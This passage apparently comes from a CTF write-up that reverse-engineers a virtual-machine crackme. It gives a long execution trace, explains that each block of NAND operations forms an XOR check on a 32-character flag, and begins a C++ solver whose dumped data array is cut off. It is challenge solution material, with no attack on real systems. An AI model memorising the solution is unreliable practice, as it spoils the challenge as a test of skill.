v12 (9)</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (57)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(298)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ( )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[298] = v12 (9)</span><br><span class="line">v10 = v1[320] (57)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (58)</span><br><span class="line">v15 = &amp;v1[325] (6)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(58)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (58)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[299] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 58 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 58</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-11)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -11</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (10)</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (58)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(299)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] (</span><br><span class="line">)</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[299] = v12 (10)</span><br><span class="line">v10 = v1[320] (58)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (59)</span><br><span class="line">v15 = &amp;v1[325] (5)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(59)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (59)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[300] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 59 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 59</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-12)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -12</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (11)</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (59)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(300)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[300] = v12 (11)</span><br><span class="line">v10 = v1[320] (59)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (60)</span><br><span class="line">v15 = &amp;v1[325] (4)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(60)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (60)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[301] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 60 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 60</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-13)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -13</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (12)</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (60)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(301)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[301] = v12 (12)</span><br><span class="line">v10 = v1[320] (60)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (61)</span><br><span class="line">v15 = &amp;v1[325] (3)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(61)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (61)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[302] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 61 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 61</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-14)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -14</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (13)</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (61)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(302)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">)14 = v1[324] (</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[302] = v12 (13)</span><br><span class="line">v10 = v1[320] (61)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (62)</span><br><span class="line">v15 = &amp;v1[325] (2)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(62)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (62)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[303] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 62 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 62</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-15)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -15</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (14)</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (62)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(303)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[303] = v12 (14)</span><br><span class="line">v10 = v1[320] (62)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (63)</span><br><span class="line">v15 = &amp;v1[325] (1)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(63)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (63)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[304] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 63 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 63</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-16)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -16</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (15)</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (63)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(304)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[304] = v12 (15)</span><br><span class="line">v10 = v1[320] (63)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (64)</span><br><span class="line">v15 = &amp;v1[325] (0)</span><br><span class="line">v14 = v1[326] ()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[188] (31)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[36] (  )</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(9)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[326] ()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[200] (31)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[304] ()</span><br><span class="line">c = v14</span><br><span class="line">__dword_6010A4 = 9     c = 15</span><br><span class="line">v14 = c - dword_6010A4</span><br><span class="line">c = v14</span><br><span class="line">v10 =v1[353] (336)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[337] (W)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Wv15 = &amp;v1[336] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[338] (r)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">rv15 = &amp;v1[336] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[339] (o)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">ov15 = &amp;v1[336] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[340] (n)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">nv15 = &amp;v1[336] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[341] (g)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">gv15 = &amp;v1[336] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[342] (</span><br><span class="line">)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">v15 = &amp;v1[336] (0)</span><br><span class="line">return</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h5 id="To-analyze-what-it-did-we-can-start-from-how-it-print-and-read-From-testing-it-read-32-characters-which-is-the-length-of-flag-And-we-know-that-the-input-is-store-in-v1-273-v1-304-It’s-basicly-a-NAND-machine-From-what-we-got-after-stimulate-the-program-we-can-see-32-‘blocks’-and-each-blocks-got-four-NAND"><a href="#To-analyze-what-it-did-we-can-start-from-how-it-print-and-read-From-testing-it-read-32-characters-which-is-the-length-of-flag-And-we-know-that-the-input-is-store-in-v1-273-v1-304-It’s-basicly-a-NAND-machine-From-what-we-got-after-stimulate-the-program-we-can-see-32-‘blocks’-and-each-blocks-got-four-NAND" class="headerlink" title="To analyze what it did, we can start from how it print and read. From testing, it read 32 characters(which is the length of flag). And we know that the input is store in v1[273] ~ v1[304]. It’s basicly a NAND machine. From what we got after stimulate the program, we can see 32 ‘blocks’ and each blocks got four NAND."></a>To analyze what it did, we can start from how it print and read. From testing, it read 32 characters(which is the length of flag). And we know that the input is store in v1[273] ~ v1[304]. It’s basicly a NAND machine. From what we got after stimulate the program, we can see 32 ‘blocks’ and each blocks got four <code>NAND</code>.</h5><p><img src="/2023/03/03/VM/blocks.png" alt="VM"></p>
<h5 id="That’s-what-we-got"><a href="#That’s-what-we-got" class="headerlink" title="That’s what we got:"></a>That’s what we got:</h5><pre><code>d_1 = ((a nand b) nand b) nand ((a nand b) nand b) 
</code></pre>
<h5 id="All-of-them-make-xor-Go-back-to-the-main-vm-run-function-here’s-what-the-rest-of-the-case-do"><a href="#All-of-them-make-xor-Go-back-to-the-main-vm-run-function-here’s-what-the-rest-of-the-case-do" class="headerlink" title="All of them make xor. Go back to the main vm_run function, here’s what the rest of the case do:"></a>All of them make <code>xor</code>. Go back to the main vm_run function, here’s what the rest of the case do:</h5><p><img src="/2023/03/03/VM/1.png" alt="VM"><br><img src="/2023/03/03/VM/2.png" alt="VM"></p>
<h5 id="So-dynamic-debugger-to-dump-the-array-v1-and-the-script"><a href="#So-dynamic-debugger-to-dump-the-array-v1-and-the-script" class="headerlink" title="So dynamic debugger to dump the array v1 and the script:"></a>So dynamic debugger to dump the array <code>v1</code> and the script:</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> a[]=&#123;<span class="number">1</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">24</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">83</span>, <span class="number">5</span>, <span class="number">86</span>, <span class="number">90</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">102</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">241</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">68</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">241</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">68</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">182</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">118</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">70</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">245</span>, <span class="number">202</span>, <span class="number">10</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span 